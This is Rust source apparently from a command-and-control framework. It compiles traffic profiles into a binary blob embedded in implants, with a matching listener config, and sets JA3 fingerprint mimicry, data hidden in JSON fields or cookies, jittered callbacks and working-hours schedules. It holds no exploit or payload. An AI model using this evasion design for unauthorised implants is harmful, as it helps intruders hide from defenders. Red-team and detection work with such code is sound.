use super::schema::*;
use crate::profile::ProfileError;

/// Response-side configuration extracted from a profile for the teamserver listener.
#[derive(Debug, Clone)]
pub struct ListenerProfile {
    pub response_template: HttpTemplate,
    pub request_template: HttpTemplate,
    pub transform: TransformChain,
    pub uri_patterns: Vec<String>,
    pub uri_rotation: UriRotation,
}

// ── TLV field IDs ──────────────────────────────────────────────────────────────

mod field_id {
    // Profile metadata
    pub const PROFILE_NAME: u8 = 0x01;

    // TLS fields
    pub const TLS_CIPHER_SUITES: u8 = 0x10;
    pub const TLS_EXTENSIONS: u8 = 0x11;
    pub const TLS_CURVES: u8 = 0x12;
    pub const TLS_ALPN: u8 = 0x13;
    pub const TLS_TARGET_JA3: u8 = 0x14;

    // HTTP request fields
    pub const HTTP_REQ_METHOD: u8 = 0x20;
    pub const HTTP_REQ_URI_PATTERN: u8 = 0x21;
    pub const HTTP_REQ_HEADER: u8 = 0x22;
    pub const HTTP_REQ_BODY_TEMPLATE: u8 = 0x23;
    pub const HTTP_REQ_EMBED_POINT: u8 = 0x24;

    // HTTP response fields
    pub const HTTP_RESP_STATUS: u8 = 0x30;
    pub const HTTP_RESP_HEADER: u8 = 0x31;
    pub const HTTP_RESP_BODY_TEMPLATE: u8 = 0x32;
    pub const HTTP_RESP_EMBED_POINT: u8 = 0x33;
    pub const HTTP_RESP_ERROR_RATE: u8 = 0x34;

    // HTTP config
    pub const HTTP_URI_ROTATION: u8 = 0x35;

    // Timing fields
    pub const TIMING_INTERVAL: u8 = 0x40;
    pub const TIMING_JITTER_DIST: u8 = 0x41;
    pub const TIMING_JITTER_PCT: u8 = 0x42;
    pub const TIMING_WORKING_HOURS: u8 = 0x43;
    pub const TIMING_BURST_WINDOW: u8 = 0x44;
    pub const TIMING_INITIAL_DELAY: u8 = 0x45;

    // Transform fields
    pub const TRANSFORM_COMPRESS: u8 = 0x50;
    pub const TRANSFORM_ENCRYPT: u8 = 0x51;
    pub const TRANSFORM_ENCODE: u8 = 0x52;
}

/// Compile a `Profile` into a TLV binary blob for implant embedding.
///
/// Format: repeated [field_id: u8][length: u16 LE][value: [u8; length]]
pub fn compile_profile(profile: &Profile) -> Result<Vec<u8>, ProfileError> {
    let mut buf = Vec::with_capacity(4096);

    // Profile name
    tlv_string(&mut buf, field_id::PROFILE_NAME, &profile.name);

    // TLS config
    for cs in &profile.tls.cipher_suites {
        tlv_string(&mut buf, field_id::TLS_CIPHER_SUITES, cs);
    }
    for ext in &profile.tls.extensions {
        tlv_string(&mut buf, field_id::TLS_EXTENSIONS, ext);
    }
    for curve in &profile.tls.curves {
        tlv_string(&mut buf, field_id::TLS_CURVES, curve);
    }
    for alpn in &profile.tls.alpn {
        tlv_string(&mut buf, field_id::TLS_ALPN, alpn);
    }
    if let Some(ja3) = &profile.tls.target_ja3 {
        tlv_string(&mut buf, field_id::TLS_TARGET_JA3, ja3);
    }

    // HTTP request
    tlv_string(
        &mut buf,
        field_id::HTTP_REQ_METHOD,
        &profile.http.request.method,
    );
    for uri in &profile.http.request.uri_patterns {
        tlv_string(&mut buf, field_id::HTTP_REQ_URI_PATTERN, uri);
    }
    for hdr in &profile.http.request.headers {
        let header_str = format!("{}: {}", hdr.name, hdr.value);
        tlv_string(&mut buf, field_id::HTTP_REQ_HEADER, &header_str);
    }
    if let Some(body) = &profile.http.request.body_template {
        tlv_string(&mut buf, field_id::HTTP_REQ_BODY_TEMPLATE, body);
    }
    for ep in &profile.http.request.data_embed_points {
        let encoded = encode_embed_point(ep);
        tlv_bytes(&mut buf, field_id::HTTP_REQ_EMBED_POINT, &encoded);
    }

    // HTTP response
    if let Some(status) = profile.http.response.status_code {
        tlv_u16(&mut buf, field_id::HTTP_RESP_STATUS, status);
    }
    for hdr in &profile.http.response.headers {
        let header_str = format!("{}: {}", hdr.name, hdr.value);
        tlv_string(&mut buf, field_id::HTTP_RESP_HEADER, &header_str);
    }
    if let Some(body) = &profile.http.response.body_template {
        tlv_string(&mut buf, field_id::HTTP_RESP_BODY_TEMPLATE, body);
    }
    for ep in &profile.http.response.data_embed_points {
        let encoded = encode_embed_point(ep);
        tlv_bytes(&mut buf, field_id::HTTP_RESP_EMBED_POINT, &encoded);
    }
    if let Some(rate) = profile.http.response.error_rate_percent {
        // Store as integer percentage * 100 (e.g., 2.5% -> 250)
        let rate_u16 = (rate * 100.0) as u16;
        tlv_u16(&mut buf, field_id::HTTP_RESP_ERROR_RATE, rate_u16);
    }

    // URI rotation mode
    let rotation_byte = match profile.http.uri_rotation {
        UriRotation::Sequential => 0u8,
        UriRotation::Random => 1u8,
        UriRotation::RoundRobin => 2u8,
    };
    tlv_bytes(&mut buf, field_id::HTTP_URI_ROTATION, &[rotation_byte]);

    // Timing
    tlv_u64(
        &mut buf,
        field_id::TIMING_INTERVAL,
        profile.timing.callback_interval,
    );
    let jitter_dist = match profile.timing.jitter_distribution {
        JitterDistribution::Uniform => 0u8,
        JitterDistribution::Gaussian => 1u8,
        JitterDistribution::Pareto => 2u8,
        JitterDistribution::Empirical => 3u8,
    };
    tlv_bytes(&mut buf, field_id::TIMING_JITTER_DIST, &[jitter_dist]);
    // Store jitter percent as u16 (percent * 100)
    let jitter_pct = (profile.timing.jitter_percent * 100.0) as u16;
    tlv_u16(&mut buf, field_id::TIMING_JITTER_PCT, jitter_pct);

    if let Some(wh) = &profile.timing.working_hours {
        let mut wh_buf = Vec::new();
        wh_buf.push(wh.start_hour);
        wh_buf.push(wh.end_hour);
        // Encode days as bitmask: Mon=0x01, Tue=0x02, ..., Sun=0x40
        let mut day_mask: u8 = 0;
        for day in &wh.days {
            day_mask |= match day.to_lowercase().as_str() {
                "mon" | "monday" => 0x01,
                "tue" | "tuesday" => 0x02,
                "wed" | "wednesday" => 0x04,
                "thu" | "thursday" => 0x08,
                "fri" | "friday" => 0x10,
                "sat" | "saturday" => 0x20,
                "sun" | "sunday" => 0x40,
                _ => 0x00,
            };
        }
        wh_buf.push(day_mask);
        // Off-hours multiplier as u16 (value * 100)
        let multiplier = (wh.off_hours_multiplier * 100.0) as u16;
        wh_buf.extend_from_slice(&multiplier.to_le_bytes());
        tlv_bytes(&mut buf, field_id::TIMING_WORKING_HOURS, &wh_buf);
    }

    for bw in &profile.timing.burst_windows {
        let mut bw_buf = Vec::new();
        bw_buf.push(bw.start_hour);
        bw_buf.push(bw.end_hour);
        bw_buf.extend_from_slice(&bw.interval_override.to_le_bytes());
        tlv_bytes(&mut buf, field_id::TIMING_BURST_WINDOW, &bw_buf);
    }

    tlv_u64(
        &mut buf,
        field_id::TIMING_INITIAL_DELAY,
        profile.timing.initial_delay,
    );

    // Transform chain
    let compress_byte = match profile.transform.compress {
        Compression::None => 0u8,
        Compression::Lz4 => 1u8,
        Compression::Zstd => 2u8,
    };
    tlv_bytes(&mut buf, field_id::TRANSFORM_COMPRESS, &[compress_byte]);
    // Encrypt is always 0 = ChaCha20-Poly1305
    tlv_bytes(&mut buf, field_id::TRANSFORM_ENCRYPT, &[0u8]);
    let encode_byte = match profile.transform.encode {
        Encoding::Base64 => 0u8,
        Encoding::Base85 => 1u8,
        Encoding::Hex => 2u8,
        Encoding::Raw => 3u8,
        Encoding::CustomAlphabet => 4u8,
    };
    tlv_bytes(&mut buf, field_id::TRANSFORM_ENCODE, &[encode_byte]);

    Ok(buf)
}

/// Extract listener-side configuration from a profile.
pub fn compile_listener_config(profile: &Profile) -> ListenerProfile {
    ListenerProfile {
        response_template: profile.http.response.clone(),
        request_template: profile.http.request.clone(),
        transform: profile.transform.clone(),
        uri_patterns: profile.http.request.uri_patterns.clone(),
        uri_rotation: profile.http.uri_rotation.clone(),
    }
}

// ── TLV encoding helpers ───────────────────────────────────────────────────────

fn tlv_bytes(buf: &mut Vec<u8>, field_id: u8, data: &[u8]) {
    buf.push(field_id);
    let len = data.len() as u16;
    buf.extend_from_slice(&len.to_le_bytes());
    buf.extend_from_slice(data);
}

fn tlv_string(buf: &mut Vec<u8>, field_id: u8, s: &str) {
    tlv_bytes(buf, field_id, s.as_bytes());
}

fn tlv_u16(buf: &mut Vec<u8>, field_id: u8, val: u16) {
    tlv_bytes(buf, field_id, &val.to_le_bytes());
}

fn tlv_u64(buf: &mut Vec<u8>, field_id: u8, val: u64) {
    tlv_bytes(buf, field_id, &val.to_le_bytes());
}

fn encode_embed_point(ep: &EmbedPoint) -> Vec<u8> {
    let mut data = Vec::new();
    // Location enum as u8
    let loc = match ep.location {
        EmbedLocation::JsonField => 0u8,
        EmbedLocation::CookieValue => 1u8,
        EmbedLocation::UriSegment => 2u8,
        EmbedLocation::QueryParam => 3u8,
        EmbedLocation::MultipartField => 4u8,
        EmbedLocation::HeaderValue => 5u8,
    };
    data.push(loc);
    // Encoding enum as u8
    let enc = match ep.encoding {
        Some(EmbedEncoding::Base64) => 0u8,
        Some(EmbedEncoding::Hex) => 1u8,
        Some(EmbedEncoding::Raw) => 2u8,
        None => 0u8, // default to base64
    };
    data.push(enc);
    // Field name as length-prefixed string
    if let Some(name) = &ep.field_name {
        let name_bytes = name.as_bytes();
        data.push(name_bytes.len() as u8);
        data.extend_from_slice(name_bytes);
    } else {
        data.push(0u8);
    }
    data
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::profile::parse_profile;

    fn test_profile_yaml() -> &'static str {
        r#"
name: test-compile
description: Profile for compiler tests
tls:
  cipher_suites: ["TLS_AES_128_GCM_SHA256"]
  alpn: ["h2", "http/1.1"]
http:
  request:
    method: POST
    uri_patterns: ["/api/test", "/api/data"]
    headers:
      - name: Content-Type
        value: application/json
      - name: User-Agent
        value: TestAgent/1.0
    body_template: '{"data": "{{data}}"}'
    data_embed_points:
      - location: json_field
        field_name: data
        encoding: base64
  response:
    status_code: 200
    body_template: '{"ok": true, "result": "{{data}}"}'
    data_embed_points:
      - location: json_field
        field_name: result
    error_rate_percent: 2.0
  uri_rotation: random
timing:
  callback_interval: 30
  jitter_distribution: gaussian
  jitter_percent: 25
  working_hours:
    start_hour: 8
    end_hour: 18
    days: ["Mon", "Tue", "Wed", "Thu", "Fri"]
    off_hours_multiplier: 4.0
  burst_windows:
    - start_hour: 12
      end_hour: 13
      interval_override: 5
  initial_delay: 120
transform:
  compress: lz4
  encrypt: chacha20-poly1305
  encode: base64
"#
    }

    #[test]
    fn test_compile_produces_valid_blob() {
        let profile = parse_profile(test_profile_yaml()).unwrap();
        let blob = compile_profile(&profile).unwrap();
        assert!(!blob.is_empty());
        // Verify the blob starts with the profile name TLV
        assert_eq!(blob[0], field_id::PROFILE_NAME);
    }

    #[test]
    fn test_compile_blob_parseable() {
        let profile = parse_profile(test_profile_yaml()).unwrap();
        let blob = compile_profile(&profile).unwrap();

        // Walk the TLV entries and verify structure
        let mut pos = 0;
        let mut field_ids_seen = Vec::new();
        while pos < blob.len() {
            assert!(pos + 3 <= blob.len(), "truncated TLV at pos {pos}");
            let fid = blob[pos];
            let len = u16::from_le_bytes([blob[pos + 1], blob[pos + 2]]) as usize;
            pos += 3;
            assert!(
                pos + len <= blob.len(),
                "TLV value overflows at field 0x{fid:02x}, pos {pos}, len {len}"
            );
            field_ids_seen.push(fid);
            pos += len;
        }
        assert_eq!(pos, blob.len(), "trailing bytes in blob");

        // Check expected fields are present
        assert!(field_ids_seen.contains(&field_id::PROFILE_NAME));
        assert!(field_ids_seen.contains(&field_id::HTTP_REQ_METHOD));
        assert!(field_ids_seen.contains(&field_id::TIMING_INTERVAL));
        assert!(field_ids_seen.contains(&field_id::TRANSFORM_COMPRESS));
        assert!(field_ids_seen.contains(&field_id::TRANSFORM_ENCODE));
    }

    #[test]
    fn test_compile_contains_profile_name() {
        let profile = parse_profile(test_profile_yaml()).unwrap();
        let blob = compile_profile(&profile).unwrap();

        // First TLV should be the name
        let fid = blob[0];
        let len = u16::from_le_bytes([blob[1], blob[2]]) as usize;
        let value = &blob[3..3 + len];
        assert_eq!(fid, field_id::PROFILE_NAME);
        assert_eq!(std::str::from_utf8(value).unwrap(), "test-compile");
    }

    #[test]
    fn test_compile_listener_config() {
        let profile = parse_profile(test_profile_yaml()).unwrap();
        let lp = compile_listener_config(&profile);
        assert_eq!(lp.uri_patterns.len(), 2);
        assert_eq!(lp.response_template.status_code, Some(200));
        assert!(matches!(lp.uri_rotation, UriRotation::Random));
    }
}
